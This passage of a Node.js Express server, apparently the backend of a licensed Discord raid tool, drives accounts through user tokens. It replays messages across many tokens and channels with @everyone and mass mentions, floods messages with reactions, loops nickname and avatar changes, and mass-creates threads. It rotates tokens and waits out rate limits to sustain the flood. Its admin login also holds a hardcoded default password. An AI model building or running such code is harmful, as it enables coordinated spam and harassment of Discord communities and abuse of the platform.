            return res.status(400).json({ error: '記録されたメッセージが見つかりません（期限切れまたは存在しません）' });
        }

        const messages = storedData.messages;
        const userDelay = Math.max(parseInt(delayMs) || 1000, 100);
        const mentionIds = userIds && userIds.length > 0 ? userIds : [];
        const selectedMentions = mentionCount && mentionCount > 0 ? Math.min(mentionCount, mentionIds.length) : 0;
        const addRandomChars = includeRandomChars === true;
        const addEveryone = includeEveryone === true;
        const suffix = appendMessage && appendMessage.trim() ? appendMessage.trim() : '';

        console.log(`[replay-messages] START: ${messages.length} msgs, ${tokens.length} tokens, ${targetChannelIds.length} channels`);

        // 初期進捗を設定
        updateProgress(operationId, {
            current: 0,
            total: messages.length,
            success: 0,
            failed: 0,
            status: 'running'
        });

        // すぐにレスポンスを返す（バックグラウンドで処理継続）
        res.json({
            success: true,
            operationId,
            totalMessages: messages.length
        });

        // バックグラウンドでメッセージ送信処理を実行
        (async () => {
            const results = { success: 0, failed: 0, total: messages.length };
            let tokenIndex = 0;
            let channelIndex = 0;
            let cancelled = false;

            for (let i = 0; i < messages.length; i++) {
                if (shouldCancel(operationId)) {
                    console.log(`[replay-messages] Cancelled at message ${i + 1}/${messages.length}`);
                    cancelled = true;
                    break;
                }

                const msg = messages[i];
                const token = tokens[tokenIndex % tokens.length];
                const channelId = targetChannelIds[channelIndex % targetChannelIds.length];
                const headers = getDiscordHeaders(token);

                // メッセージ内容を構築
                let content = msg.content;

                // 末尾にカスタムメッセージを追加
                if (suffix) {
                    content = content + ' ' + suffix;
                }

                // ユーザーメンションを末尾に追加
                if (selectedMentions > 0 && mentionIds.length > 0) {
                    const shuffled = [...mentionIds].sort(() => Math.random() - 0.5);
                    const mentions = shuffled.slice(0, selectedMentions).map(id => `<@${id}>`).join(' ');
                    content = content + ' ' + mentions;
                }

                // @everyoneを末尾に追加
                if (addEveryone) {
                    content = content + ' @everyone';
                }

                // ランダム文字を末尾に追加
                if (addRandomChars) {
                    content = content + ' ' + generateRandomChars(64);
                }

                try {
                    await axios.post(
                        `${DISCORD_API_BASE}/channels/${channelId}/messages`,
                        { content, allowed_mentions: { parse: ['everyone', 'users', 'roles'] } },
                        { headers, timeout: 15000 }
                    );
                    results.success++;
                    console.log(`[replay-messages] Sent ${i + 1}/${messages.length}`);
                } catch (err) {
                    if (err.response?.status === 429) {
                        const retryAfter = parseFloat(err.response?.data?.retry_after || 2) * 1000;
                        console.log(`[replay-messages] Rate limited, waiting ${retryAfter}ms`);
                        await delay(retryAfter + 100);
                        i--; // リトライ
                        continue;
                    }
                    results.failed++;
                    console.log(`[replay-messages] Failed ${i + 1}: ${err.response?.data?.message || err.message}`);
                }

                // 次のトークン・チャンネルに移動
                tokenIndex++;
                channelIndex++;

                // 進捗を更新
                updateProgress(operationId, {
                    current: i + 1,
                    total: messages.length,
                    success: results.success,
                    failed: results.failed,
                    status: 'running'
                });

                // 遅延
                if (i < messages.length - 1) {
                    await delay(userDelay);
                }
            }

            // 完了状態を更新
            updateProgress(operationId, {
                current: results.success + results.failed,
                total: messages.length,
                success: results.success,
                failed: results.failed,
                status: cancelled ? 'cancelled' : 'completed'
            });

            endOperation(operationId);
            console.log(`[replay-messages] ${cancelled ? 'CANCELLED' : 'COMPLETED'}: ${results.success}/${messages.length} sent`);
        })();

    } catch (error) {
        endOperation(operationId);
        console.error('Error replaying messages:', error.response?.data || error.message);
        res.status(500).json({ error: 'メッセージの再送信に失敗しました' });
    }
});

// 再送信キャンセルAPI
app.post('/api/cancel-replay-messages', (req, res) => {
    const count = cancelOperationsByType('replay-messages');
    res.json({ success: true, cancelledCount: count });
});

// 再送信進捗取得API
app.get('/api/replay-progress/:operationId', (req, res) => {
    const progress = getProgress(req.params.operationId);
    if (progress) {
        res.json({ 
            success: true, 
            sent: progress.current || 0,
            total: progress.total || 0,
            status: progress.status || 'running',
            errors: progress.failed > 0 ? Array(progress.failed).fill({ message: 'エラー' }) : []
        });
    } else {
        res.json({ success: false, error: 'Progress not found' });
    }
});

const ANKO_REACTIONS = ['🅰️', '🇳', '🇰', '🅾️', '😝', '🥹', '🇹', '⭕', '🇵', '🥰', '🩵', '💚', '💜', '🧡', '🩷'];

const hasAnkoReaction = (message, userId) => {
    if (!message.reactions || message.reactions.length === 0) return false;
    for (const reaction of message.reactions) {
        const emojiStr = reaction.emoji.id ? `${reaction.emoji.name}:${reaction.emoji.id}` : reaction.emoji.name;
        if (ANKO_REACTIONS.includes(emojiStr) || ANKO_REACTIONS.includes(reaction.emoji.name)) {
            if (reaction.me) return true;
        }
    }
    return false;
};

app.post('/api/add-reactions', async (req, res) => {
    try {
        const { tokens, channelIds, messageCount, delayMs, skipAlreadyReacted } = req.body;

        if (!tokens || tokens.length === 0) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        if (!channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'チャンネルIDが必要です' });
        }

        const operationId = startOperation('add-reactions');
        const userDelay = Math.max(delayMs || 300, 100);
        const msgCount = Math.min(Math.max(messageCount || 10, 1), 100);
        const skipReacted = skipAlreadyReacted !== false;

        res.json({ success: true, operationId });

        (async () => {
            let totalReactions = 0;
            let successCount = 0;
            let failedCount = 0;
            let skippedCount = 0;
            let cancelled = false;

            const allMessages = [];

            for (const channelId of channelIds) {
                if (shouldCancel(operationId)) {
                    cancelled = true;
                    break;
                }

                try {
                    const headers = getDiscordHeaders(tokens[0]);
                    const messagesRes = await axios.get(
                        `${DISCORD_API_BASE}/channels/${channelId}/messages?limit=${msgCount}`,
                        { headers, timeout: 15000 }
                    );

                    for (const msg of messagesRes.data) {
                        const shouldSkip = skipReacted && hasAnkoReaction(msg);
                        if (shouldSkip) {
                            skippedCount++;
                            console.log(`[add-reactions] Skipping message ${msg.id} - already has ANKO reaction`);
                        } else {
                            allMessages.push({ channelId, messageId: msg.id, reactions: msg.reactions || [] });
                        }
                    }
                } catch (err) {
                    console.log(`[add-reactions] Failed to fetch messages from ${channelId}: ${err.response?.data?.message || err.message}`);
                }

                await delay(200);
            }

            totalReactions = allMessages.length * ANKO_REACTIONS.length;

            updateProgress(operationId, {
                current: 0,
                total: totalReactions,
                success: 0,
                failed: 0,
                skipped: skippedCount,
                status: 'running'
            });

            let tokenIndex = 0;
            let reactionsDone = 0;

            for (const { channelId, messageId, reactions } of allMessages) {
                if (shouldCancel(operationId)) {
                    cancelled = true;
                    break;
                }

                for (const emoji of ANKO_REACTIONS) {
                    if (shouldCancel(operationId)) {
                        cancelled = true;
                        break;
                    }

                    const token = tokens[tokenIndex % tokens.length];
                    tokenIndex++;

                    try {
                        const headers = getDiscordHeaders(token);
                        const encodedEmoji = encodeURIComponent(emoji);

                        await axios.put(
                            `${DISCORD_API_BASE}/channels/${channelId}/messages/${messageId}/reactions/${encodedEmoji}/@me`,
                            {},
                            { headers, timeout: 15000 }
                        );

                        successCount++;
                    } catch (err) {
                        if (err.response?.status === 429) {
                            const retryAfter = parseFloat(err.response?.data?.retry_after || 1) * 1000;
                            console.log(`[add-reactions] Rate limited, waiting ${retryAfter}ms`);
                            await delay(retryAfter + 100);
                            tokenIndex--;
                            continue;
                        }
                        failedCount++;
                        console.log(`[add-reactions] Failed: ${err.response?.data?.message || err.message}`);
                    }

                    reactionsDone++;
                    updateProgress(operationId, {
                        current: reactionsDone,
                        total: totalReactions,
                        success: successCount,
                        failed: failedCount,
                        skipped: skippedCount,
                        status: 'running'
                    });

                    await delay(userDelay);
                }
            }

            updateProgress(operationId, {
                current: reactionsDone,
                total: totalReactions,
                success: successCount,
                failed: failedCount,
                skipped: skippedCount,
                status: cancelled ? 'cancelled' : 'completed'
            });

            endOperation(operationId);
            console.log(`[add-reactions] ${cancelled ? 'CANCELLED' : 'COMPLETED'}: ${successCount}/${totalReactions} reactions added, ${skippedCount} messages skipped`);
        })();

    } catch (error) {
        console.error('Error adding reactions:', error.message);
        res.status(500).json({ error: 'リアクション追加の開始に失敗しました' });
    }
});

app.post('/api/cancel-reaction', (req, res) => {
    const count = cancelOperationsByType('add-reactions');
    for (const [id, data] of operationProgress.entries()) {
        if (data.status === 'running') {
            operationProgress.delete(id);
        }
    }
    res.json({ success: true, cancelledCount: count });
});

app.get('/api/reaction-progress/:operationId', (req, res) => {
    const progress = getProgress(req.params.operationId);
    if (progress) {
        res.json({
            success: true,
            current: progress.current || 0,
            total: progress.total || 0,
            success: progress.success || 0,
            failed: progress.failed || 0,
            status: progress.status || 'running'
        });
    } else {
        res.json({ success: false, error: 'Progress not found' });
    }
});

// ============================================
// USER AVATAR (Global User Avatar)
// ============================================

app.post('/api/update-guild-avatar', async (req, res) => {
    try {
        let { token, avatarBase64 } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        const headers = getDiscordHeaders(token);
        
        const payload = {
            avatar: avatarBase64 || null
        };

        const response = await axios.patch(`${DISCORD_API_BASE}/users/@me`, payload, { headers });

        res.json({
            success: true,
            avatar: response.data.avatar || null,
            message: 'ユーザーアバターを変更しました'
        });

    } catch (error) {
        console.error('Error updating user avatar:', error.response?.data || error.message);
        
        if (error.response?.status === 401) {
            res.status(401).json({ success: false, error: 'トークンが無効です' });
        } else if (error.response?.status === 403) {
            res.status(403).json({ success: false, error: 'アバターを変更する権限がありません' });
        } else if (error.response?.status === 400) {
            res.status(400).json({ success: false, error: error.response?.data?.message || 'アバターが無効です' });
        } else {
            res.status(500).json({ success: false, error: 'アバターの変更に失敗しました' });
        }
    }
});

// ============================================
// RANDOM NAME CHANGER (Toggle)
// ============================================

const randomNameOperations = new Map();

app.post('/api/random-name/start', async (req, res) => {
    try {
        let { token, guildId, customNames, suffix, intervalMs } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        if (!guildId || !/^\d{17,19}$/.test(guildId)) {
            return res.status(400).json({ error: '有効なサーバーIDを入力してください' });
        }

        const baseInterval = Math.max(intervalMs || 1000, 1000);
        const operationId = startOperation('random-name');
        const nameSuffix = suffix && typeof suffix === 'string' ? suffix.trim() : '';

        const generateRandomChars = (length = 8) => {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const defaultEmojiNames = ['🤍', '💜', '💛', '🩷', '🩵', '💚', '💙', '❤️‍🔥'];
        const names = customNames && customNames.length > 0 ? customNames : defaultEmojiNames;

        updateProgress(operationId, {
            current: 0,
            lastName: '',
            currentInterval: baseInterval,
            status: 'running'
        });

        const runRandomName = async () => {
            let lastName = null;
            let changeCount = 0;
            let currentInterval = baseInterval;
            const safetyBuffer = 200;
            
            let rateLimitState = {
                remaining: null,
                limit: null,
                resetAt: null,
                bucket: null
            };
            
            while (!shouldCancel(operationId)) {
                try {
                    const now = Date.now();
                    
                    if (rateLimitState.remaining !== null && rateLimitState.remaining <= 0 && rateLimitState.resetAt > now) {
                        const waitTime = rateLimitState.resetAt - now + safetyBuffer;
                        updateProgress(operationId, {
                            current: changeCount,
                            lastName: `🛡️ リセット待機中 (${Math.ceil(waitTime/1000)}秒)`,
                            currentInterval: waitTime,
                            status: 'running',
                            rateInfo: `残0/${rateLimitState.limit}`
                        });
                        await delay(waitTime);
                        rateLimitState.remaining = rateLimitState.limit;
                        continue;
                    }
                    
                    const headers = getDiscordHeaders(token);
                    let baseName;
                    
                    if (names) {
                        if (names.length === 1) {
                            baseName = names[0];
                        } else {
                            do {
                                baseName = names[Math.floor(Math.random() * names.length)];
                            } while (baseName === lastName);
                        }
                    } else {
                        do {
                            baseName = generateRandomChars(Math.floor(Math.random() * 20) + 5);
                        } while (baseName === lastName);
                    }
                    
                    lastName = baseName;
                    const newName = nameSuffix ? `${baseName} ${nameSuffix}` : baseName;
                    
                    const response = await axios.patch(`${DISCORD_API_BASE}/guilds/${guildId}/members/@me`, 
                        { nick: newName },
                        { headers }
                    );
                    
                    const remaining = parseInt(response.headers['x-ratelimit-remaining'] ?? '-1');
                    const resetAfter = parseFloat(response.headers['x-ratelimit-reset-after'] || '0');
                    const limit = parseInt(response.headers['x-ratelimit-limit'] || '1');
                    const bucket = response.headers['x-ratelimit-bucket'] || null;
                    
                    rateLimitState = {
                        remaining: remaining,
                        limit: limit,
                        resetAt: Date.now() + (resetAfter * 1000),
                        bucket: bucket
                    };
                    
                    if (remaining >= 0 && resetAfter > 0) {
                        if (remaining === 0) {
                            currentInterval = (resetAfter * 1000) + safetyBuffer;
                        } else {
                            const optimalInterval = (resetAfter * 1000) / remaining;
                            currentInterval = Math.max(optimalInterval + safetyBuffer, baseInterval);
                        }
                    } else {
                        currentInterval = baseInterval;
                    }
                    
                    changeCount++;
                    updateProgress(operationId, {
                        current: changeCount,
                        lastName: newName,
                        currentInterval: currentInterval,
                        status: 'running',
                        rateInfo: `残${remaining}/${limit} (${Math.ceil(currentInterval/1000)}秒)`
                    });
                } catch (err) {
                    if (err.response?.status === 429) {
                        const retryAfter = parseFloat(err.response?.data?.retry_after || 5) * 1000;
                        const isGlobal = err.response?.data?.global || false;
                        
                        rateLimitState = {
                            remaining: 0,
                            limit: rateLimitState.limit || 1,
                            resetAt: Date.now() + retryAfter + safetyBuffer,
                            bucket: rateLimitState.bucket
                        };
                        
                        updateProgress(operationId, {
                            current: changeCount,
                            lastName: `⏳ ${isGlobal ? 'グローバル' : ''}レート制限 (${Math.ceil(retryAfter/1000)}秒待機)`,
                            currentInterval: retryAfter + safetyBuffer,
                            status: 'running',
                            rateInfo: `制限中`
                        });
                        await delay(retryAfter + safetyBuffer);
                        continue;
                    }
                    console.log(`[random-name] Error: ${err.response?.data?.message || err.message}`);
                    updateProgress(operationId, {
                        current: changeCount,
                        lastName: lastName || '(エラー)',
                        currentInterval: currentInterval,
                        status: 'running'
                    });
                }
                await delay(currentInterval);
            }
            endOperation(operationId);
            randomNameOperations.delete(operationId);
            updateProgress(operationId, { status: 'stopped' });
        };

        randomNameOperations.set(operationId, { token, guildId });
        runRandomName();

        res.json({ success: true, operationId });

    } catch (error) {
        console.error('Error starting random name:', error.message);
        res.status(500).json({ error: 'ランダム名前変更の開始に失敗しました' });
    }
});

app.post('/api/random-name/stop', (req, res) => {
    const count = cancelOperationsByType('random-name');
    randomNameOperations.clear();
    res.json({ success: true, cancelledCount: count });
});

app.get('/api/random-name/status/:operationId', (req, res) => {
    const progress = getProgress(req.params.operationId);
    if (progress) {
        res.json({
            success: true,
            changeCount: progress.current || 0,
            lastName: progress.lastName || '',
            currentInterval: progress.currentInterval || 1000,
            status: progress.status || 'running'
        });
    } else {
        res.json({ success: false, status: 'stopped' });
    }
});

// ============================================
// THREAD RAPID CREATION
// ============================================

const threadCreationOperations = new Map();

app.post('/api/thread-create/start', async (req, res) => {
    try {
        let { token, channelIds, channelId, threadName, intervalMs } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        let channels = [];
        if (channelIds && Array.isArray(channelIds)) {
            channels = channelIds.filter(id => /^\d{17,19}$/.test(id));
        } else if (channelId && /^\d{17,19}$/.test(channelId)) {
            channels = [channelId];
        }

        if (channels.length === 0) {
            return res.status(400).json({ error: '有効なチャンネルIDを入力してください' });
        }

        const baseThreadName = threadName && threadName.trim() ? threadName.trim() : 'スレッド';
        const baseInterval = Math.max(intervalMs || 2000, 1000);
        const operationId = startOperation('thread-create');

        const channelStats = {};
        channels.forEach(ch => {
            channelStats[ch] = { count: 0, lastThread: '', interval: baseInterval };
        });

        updateProgress(operationId, {
            totalThreads: 0,
            channelCount: channels.length,
            channelStats: channelStats,
            lastThread: '',
            status: 'running'
        });

        const runChannelThreadCreation = async (targetChannelId) => {
            let threadCount = 0;
            let currentInterval = baseInterval;
            let consecutiveRateLimits = 0;
            const maxInterval = 30000;
            
            while (!shouldCancel(operationId)) {
                try {
                    const headers = getDiscordHeaders(token);
                    const fullThreadName = `${baseThreadName} #${threadCount + 1}`;
                    
                    const response = await axios.post(`${DISCORD_API_BASE}/channels/${targetChannelId}/threads`, 
                        { 
                            name: fullThreadName.substring(0, 100),
                            type: 11,
                            auto_archive_duration: 60
                        },
                        { headers }
                    );
                    
                    const remaining = parseInt(response.headers['x-ratelimit-remaining'] || '5');
                    const resetAfter = parseFloat(response.headers['x-ratelimit-reset-after'] || '2');
                    
                    if (remaining <= 1 && resetAfter > 0) {
                        currentInterval = Math.min(Math.max(resetAfter * 1000 + 200, baseInterval), maxInterval);
                    } else if (consecutiveRateLimits > 0) {
                        consecutiveRateLimits = Math.max(0, consecutiveRateLimits - 1);
                        if (consecutiveRateLimits === 0) {
                            currentInterval = baseInterval;
                        }
                    }
                    
                    threadCount++;
                    channelStats[targetChannelId] = { count: threadCount, lastThread: fullThreadName, interval: currentInterval };
                    
                    const totalThreads = Object.values(channelStats).reduce((sum, s) => sum + s.count, 0);
                    updateProgress(operationId, {
                        totalThreads: totalThreads,
                        channelCount: channels.length,
                        channelStats: channelStats,
                        lastThread: fullThreadName,
                        status: 'running'
                    });
                } catch (err) {
                    if (err.response?.status === 429) {
                        consecutiveRateLimits++;
                        const retryAfter = parseFloat(err.response?.data?.retry_after || 5) * 1000;
                        currentInterval = Math.min(currentInterval + 1000 * consecutiveRateLimits, maxInterval);
                        
                        channelStats[targetChannelId].lastThread = `⏳ レート制限 (${Math.ceil(retryAfter/1000)}秒)`;
                        await delay(retryAfter + 200);
                        continue;
                    }
                    console.log(`[thread-create] Channel ${targetChannelId} Error: ${err.response?.data?.message || err.message}`);
                    channelStats[targetChannelId].lastThread = `エラー: ${err.response?.data?.message || err.message}`;
                }
                await delay(currentInterval);
            }
        };

        threadCreationOperations.set(operationId, { token, channels });
        
        channels.forEach(ch => {
            runChannelThreadCreation(ch).then(() => {
                const stillRunning = channels.some(c => channelStats[c]?.lastThread && !shouldCancel(operationId));
                if (!stillRunning) {
                    endOperation(operationId);
                    threadCreationOperations.delete(operationId);
                    updateProgress(operationId, { status: 'stopped' });
                }
            });
        });

        res.json({ success: true, operationId, channelCount: channels.length });

    } catch (error) {
        console.error('Error starting thread creation:', error.message);
        res.status(500).json({ error: 'スレッド作成の開始に失敗しました' });
    }
});

app.post('/api/thread-create/stop', (req, res) => {
    const count = cancelOperationsByType('thread-create');
    threadCreationOperations.clear();
    res.json({ success: true, cancelledCount: count });
});

app.get('/api/thread-create/status/:operationId', (req, res) => {
    const progress = getProgress(req.params.operationId);
    if (progress) {
        res.json({
            success: true,
            totalThreads: progress.totalThreads || progress.current || 0,
            channelCount: progress.channelCount || 1,
            lastThread: progress.lastThread || '',
            channelStats: progress.channelStats || {},
            status: progress.status || 'running'
        });
    } else {
        res.json({ success: false, status: 'stopped' });
    }
});

// ============================================
// RANDOM AVATAR CHANGER (Toggle)
// ============================================

const randomAvatarOperations = new Map();

const generateRandomAvatarBase64 = () => {
    const width = 128;
    const height = 128;
    const colors = [
        [255, 0, 0], [0, 255, 0], [0, 0, 255], [255, 255, 0], [255, 0, 255], [0, 255, 255],
        [128, 0, 0], [0, 128, 0], [0, 0, 128], [128, 128, 0], [128, 0, 128], [0, 128, 128],
        [255, 128, 0], [255, 0, 128], [128, 255, 0], [0, 255, 128], [128, 0, 255], [0, 128, 255]
    ];
    
    const color1 = colors[Math.floor(Math.random() * colors.length)];
    const color2 = colors[Math.floor(Math.random() * colors.length)];
    
    const pixelData = [];
    for (let y = 0; y < height; y++) {
        for (let x = 0; x < width; x++) {
            const t = (x + y) / (width + height);
            const r = Math.round(color1[0] * (1 - t) + color2[0] * t);
            const g = Math.round(color1[1] * (1 - t) + color2[1] * t);
            const b = Math.round(color1[2] * (1 - t) + color2[2] * t);
            pixelData.push(r, g, b);
        }
    }
    
    const ppmHeader = `P6\n${width} ${height}\n255\n`;
    const headerBuffer = Buffer.from(ppmHeader, 'ascii');
    const dataBuffer = Buffer.from(pixelData);
    const ppmBuffer = Buffer.concat([headerBuffer, dataBuffer]);
    
    return `data:image/png;base64,${ppmBuffer.toString('base64')}`;
};

app.post('/api/random-avatar/start', async (req, res) => {
    try {
        let { token, intervalMs, avatarUrls } = req.body;

        if (!token || typeof token !== 'string') {
            return res.status(400).json({ error: 'トークンが必要です' });
        }
        token = token.trim();
        if (!token) {
            return res.status(400).json({ error: 'トークンが必要です' });
        }

        // First cancel any existing random-avatar operations
        cancelOperationsByType('random-avatar');
        randomAvatarOperations.clear();

        const interval = Math.max(intervalMs || 2000, 100);
        const operationId = startOperation('random-avatar');

        const runRandomAvatar = async () => {
            const avatarList = avatarUrls && avatarUrls.length > 0 ? avatarUrls : null;
            
            while (!shouldCancel(operationId)) {
                try {
                    const headers = getDiscordHeaders(token);
                    let avatarBase64 = null;
                    
                    if (avatarList) {
                        const url = avatarList[Math.floor(Math.random() * avatarList.length)];
                        try {
                            const imgRes = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
                            const contentType = imgRes.headers['content-type'] || 'image/png';
                            avatarBase64 = `data:${contentType};base64,${Buffer.from(imgRes.data).toString('base64')}`;
                        } catch (e) {
                            console.log('[random-avatar] Failed to fetch image:', e.message);
                            await delay(interval);
                            continue;
                        }
                    } else {
                        const r = Math.floor(Math.random() * 256);
                        const g = Math.floor(Math.random() * 256);
                        const b = Math.floor(Math.random() * 256);
                        const pixel = Buffer.alloc(3);
                        pixel[0] = r; pixel[1] = g; pixel[2] = b;
                        const singlePixel = Buffer.from([
                            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
                            0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41,
                            0x54, 0x08, 0xD7, 0x63, 0xF8, 0x0F, 0x00, 0x00,
                            0x01, 0x01, 0x00, 0x05, 0x18, 0xD8, 0x4D, 0x00,
                            0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE,
                            0x42, 0x60, 0x82
                        ]);
                        avatarBase64 = `data:image/png;base64,${singlePixel.toString('base64')}`;
                    }
                    
                    await axios.patch(`${DISCORD_API_BASE}/users/@me`, 
                        { avatar: avatarBase64 },
                        { headers }
                    );
                    
                    updateProgress(operationId, {
                        current: (getProgress(operationId)?.current || 0) + 1,
                        status: 'running'
                    });
                } catch (err) {
                    if (err.response?.status === 429) {
                        const retryAfter = parseFloat(err.response?.data?.retry_after || 5) * 1000;
                        await delay(retryAfter + 100);
                        continue;
                    }
                    console.log(`[random-avatar] Error: ${err.response?.data?.message || err.message}`);
                }
                await delay(interval);
            }
            endOperation(operationId);
            randomAvatarOperations.delete(operationId);
            updateProgress(operationId, { status: 'stopped' });
        };

        randomAvatarOperations.set(operationId, { token });
        runRandomAvatar();

        res.json({ success: true, operationId });

    } catch (error) {
        console.error('Error starting random avatar:', error.message);
        res.status(500).json({ error: 'ランダムアバター変更の開始に失敗しました' });
    }
});

app.post('/api/random-avatar/stop', (req, res) => {
    const count = cancelOperationsByType('random-avatar');
    randomAvatarOperations.clear();
    res.json({ success: true, cancelledCount: count });
});

app.get('/api/random-avatar/status/:operationId', (req, res) => {
    const progress = getProgress(req.params.operationId);
    if (progress) {
        res.json({
            success: true,
            changeCount: progress.current || 0,
            status: progress.status || 'running'
        });
    } else {
        res.json({ success: false, status: 'stopped' });
    }
});

// ============================================
// LICENSE SYSTEM API ENDPOINTS
// ============================================

app.post('/api/license/verify', async (req, res) => {
    try {
        const { licenseKey } = req.body;
        if (!licenseKey) {
            return res.status(400).json({ success: false, error: 'ライセンスキーが必要です' });
        }

        let sessionId = req.headers['x-session-id'];
        if (!sessionId) {
            sessionId = generateSessionId();
        }

        const result = await validateLicenseKey(licenseKey.trim(), sessionId);
        
        if (!result.valid) {
            let errorMessage = 'ライセンスキーが無効です';
            if (result.reason === 'not_found') {
                errorMessage = 'ライセンスキーが見つかりません';
            } else if (result.reason === 'revoked') {
                errorMessage = 'このライセンスキーは無効化されています';
            } else if (result.reason === 'already_bound') {
                errorMessage = 'このキーは既に使用中です。ブラウザを変えた場合やストレージをクリアした場合は、管理者に「セッション解除」を依頼してください。';
            }
            return res.status(401).json({ success: false, error: errorMessage, reason: result.reason });
        }

        activeLicenseSessions.set(sessionId, {
            licenseKey: licenseKey.trim(),
            validatedAt: Date.now()
        });

        res.json({ 
            success: true, 
            sessionId: sessionId,
            message: 'ライセンス認証成功'
        });
    } catch (error) {
        console.error('License verify error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

app.post('/api/license/status', async (req, res) => {
    try {
        const settings = await getLicenseSettings();
        
        if (!settings.requireLicense) {
            return res.json({ success: true, required: false, valid: true });
        }

        const sessionId = req.headers['x-session-id'];
        const { licenseKey } = req.body;

        if (!sessionId || !licenseKey) {
            return res.json({ success: true, required: true, valid: false });
        }

        const result = await checkLicenseSession(licenseKey, sessionId);
        
        res.json({ 
            success: true, 
            required: true, 
            valid: result.valid,
            reason: result.reason
        });
    } catch (error) {
        console.error('License status error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

app.get('/api/license/settings-public', async (req, res) => {
    try {
        const settings = await getLicenseSettings();
        res.json({ 
            success: true, 
            requireLicense: settings.requireLicense 
        });
    } catch (error) {
        console.error('License settings error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

// ============================================
// ADMIN PANEL API ENDPOINTS
// ============================================

const adminSessions = new Map();

app.post('/api/admin/login', async (req, res) => {
    try {
        const { password } = req.body;
        if (!password) {
            return res.status(400).json({ success: false, error: 'パスワードが必要です' });
        }

        let storedHash = await getAdminPasswordHash();
        
        if (!storedHash) {
            const defaultPassword = 'aa119289621';
            storedHash = await bcrypt.hash(defaultPassword, 10);
            await setAdminPasswordHash(storedHash);
        }

        const isValid = await bcrypt.compare(password, storedHash);
        
        if (!isValid) {
            return res.status(401).json({ success: false, error: 'パスワードが間違っています' });
        }

        const adminSessionId = generateSessionId();
        adminSessions.set(adminSessionId, {
            createdAt: Date.now(),
            expiresAt: Date.now() + (24 * 60 * 60 * 1000)
        });

        res.json({ 
            success: true, 
            adminSessionId: adminSessionId,
            message: '管理者ログイン成功'
        });
    } catch (error) {
        console.error('Admin login error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

const verifyAdminSession = (req, res, next) => {
    const adminSessionId = req.headers['x-admin-session'];
    if (!adminSessionId) {
        return res.status(401).json({ success: false, error: '管理者認証が必要です' });
    }
    
    const session = adminSessions.get(adminSessionId);
    if (!session || Date.now() > session.expiresAt) {
        adminSessions.delete(adminSessionId);
        return res.status(401).json({ success: false, error: 'セッションが無効または期限切れです' });
    }
    
    next();
};

app.get('/api/admin/license-settings', verifyAdminSession, async (req, res) => {
    try {
        const settings = await getLicenseSettings();
        const keys = await getAllLicenseKeys();
        
        const keysWithStatus = Object.entries(keys).map(([key, data]) => ({
            key: key,
            ...data,
            isBound: !!data.boundToSessionId
        }));
        
        res.json({ 
            success: true, 
            requireLicense: settings.requireLicense,
            licenseKeys: keysWithStatus
        });
    } catch (error) {
        console.error('Get license settings error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

app.patch('/api/admin/license-settings', verifyAdminSession, async (req, res) => {
    try {
        const { requireLicense } = req.body;
        if (typeof requireLicense !== 'boolean') {
            return res.status(400).json({ success: false, error: 'requireLicenseはbooleanである必要があります' });
        }
        
        await setRequireLicense(requireLicense);
        res.json({ success: true, requireLicense: requireLicense });
    } catch (error) {
        console.error('Update license settings error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

app.post('/api/admin/license-keys', verifyAdminSession, async (req, res) => {
    try {
        const { issuedTo } = req.body;
        const key = await createLicenseKey(issuedTo || '');
        res.json({ success: true, key: key, issuedTo: issuedTo || '' });
    } catch (error) {
        console.error('Create license key error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

app.patch('/api/admin/license-keys/:key', verifyAdminSession, async (req, res) => {
    try {
        const { key } = req.params;
        const { action } = req.body;
        
        if (action === 'revoke') {
            const result = await revokeLicenseKey(key);
            if (!result) {
                return res.status(404).json({ success: false, error: 'キーが見つかりません' });
            }
            res.json({ success: true, message: 'キーを無効化しました' });
        } else if (action === 'reactivate') {
            const result = await reactivateLicenseKey(key);
            if (!result) {
                return res.status(404).json({ success: false, error: 'キーが見つかりません' });
            }
            res.json({ success: true, message: 'キーを再有効化しました' });
        } else {
            res.status(400).json({ success: false, error: '無効なアクションです' });
        }
    } catch (error) {
        console.error('Update license key error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

app.patch('/api/admin/license-keys/:key/unbind', verifyAdminSession, async (req, res) => {
    try {
        const { key } = req.params;
        const result = await unbindLicenseKey(key);
        
        if (!result) {
            return res.status(404).json({ success: false, error: 'キーが見つかりません' });
        }
        
        res.json({ success: true, message: 'セッションの紐づけを解除しました' });
    } catch (error) {
        console.error('Unbind license key error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

app.delete('/api/admin/license-keys/:key', verifyAdminSession, async (req, res) => {
    try {
        const { key } = req.params;
